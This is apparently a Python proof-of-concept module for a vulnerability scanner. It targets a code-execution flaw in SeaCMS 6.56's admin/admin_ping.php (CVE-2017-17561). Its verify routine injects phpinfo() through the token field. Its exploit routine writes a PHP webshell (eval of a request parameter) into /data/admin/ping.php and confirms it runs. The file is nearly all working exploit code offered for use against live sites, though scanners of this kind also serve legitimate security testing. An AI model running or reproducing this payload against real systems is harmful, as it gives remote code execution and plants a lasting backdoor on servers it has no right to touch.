# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SEACMS_0006_L'  # 平台漏洞编号，留空
    name = 'SeaCMS admin/admin_ping.php文件代码执行漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-12-14'  # 漏洞公布时间
    desc = '''
        SeaCMS是一套使用PHP编写的免费、开源的网站内容管理系统。该系统主要被设计用来管理视频点播资源。
        SeaCMS 6.56版本中存在安全漏洞。远程攻击者可通过向admin/admin_ping.php文件发送特制的token字段利用该漏洞执行任意的PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-00666'  # 漏洞来源
    cnvd_id = 'CNVD-2018-00666'  # cnvd漏洞编号
    cve_id = 'CVE-2017-17561'  # cve编号
    product = 'SEACMS(海洋CMS)'  # 漏洞应用名称
    product_version = '6.56'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa215685-7f6a-4f54-b1ac-8611b8ce2078'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': 'cookies',
                    'default': 'bid=111;uid=222',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先登录用户。获取cookies
            s = requests.session()
            cookies = {}
            raw_cookies = self.get_option('cookies')
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value

            # 验证漏洞
            payload = '/admin/admin_ping.php?action=set'
            url = self.target + payload
            data = {
                "token": "123456789\";$var=phpinfo().\""
            }
            self.output.info('正在尝试上传可执行代码 phpinfo() 到/data/admin/ping.php中')
            s.post(url, data=data, cookies=cookies)
            verify_url = self.target + '/data/admin/ping.php'
            r = s.get(verify_url)

            if 'PHPVersion' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传可执行代码 phpinfo() 到/data/admin/ping.php中'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先登录用户。获取cookies
            s = requests.session()
            cookies = {}
            raw_cookies = self.get_option('cookies')
            for line in raw_cookies.split(';'):
                key, value = line.split('=', 1)  # 1代表只分一次，得到两个数据
                cookies[key] = value

            # 验证漏洞
            payload = '/admin/admin_ping.php?action=set'
            url = self.target + payload
            data = {
                "token": "123456789\";$var=eval($_REQUEST[c]).\""
            }
            self.output.info(
                '正在尝试上传webshell <eval($_REQUEST[c])> 到/data/admin/ping.php中')
            s.post(url, data=data, cookies=cookies)
            verify_url = self.target + '/data/admin/ping.php?c=phpinfo()'
            r = s.get(verify_url)
            verify_url = self.target + '/data/admin/ping.php'

            if 'PHPVersion' in r.text and 'System' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞， ，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
